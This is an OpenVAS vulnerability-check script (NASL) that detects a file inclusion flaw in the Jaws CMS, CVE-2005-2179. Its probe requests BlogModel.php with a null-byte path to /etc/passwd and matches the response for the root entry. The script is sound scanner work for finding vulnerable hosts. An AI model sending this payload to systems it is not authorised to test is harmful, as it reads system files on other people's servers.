# OpenVAS Vulnerability Test
# $Id: jaws_file_inclusion.nasl 17 2013-10-27 14:01:43Z jan $
# Description: File Inclusion Vulnerability in Jaws
#
# Authors:
# Josh Zlatin-Amishav
# Fixed by Tenable:
#   - added CVE xref
#   - added See also and Solution.
#   - fixed script family.
#   - changed exploit and test of its success.
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host is running JAWS, a content management system written
in PHP. 

The remote version of Jaws allows an attacker to include URLs
remotely.";

tag_solution = "Upgrade to JAWS version 0.5.3 or later.";

if(description)
{
  script_id(19395);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-2179");
  script_bugtraq_id(14158);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  name = "File Inclusion Vulnerability in Jaws";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;

  script_description(desc);
 
  summary = "Detect Jaws File Inclusion Vulnerability";
  script_summary(summary);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");

  family = "Web application abuses";
  script_family(family);
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.hardened-php.net/advisory-072005.php");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port) ) exit(0);
if (! can_host_php(port:port) ) exit(0);

foreach dir ( cgi_dirs() )
{
  req = http_get(
    item:string(
      dir, "/gadgets/Blog/BlogModel.php?",
      "path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if ( res == NULL ) exit(0);

  if ( 
    # we could read /etc/passwd.
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we got an error suggesting magic_quotes_gpc was enabled but
    # remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: .+ Failed opening '/etc/passwd.+for inclusion")
  ) {
   security_warning(port);
   exit(0);
  }
}
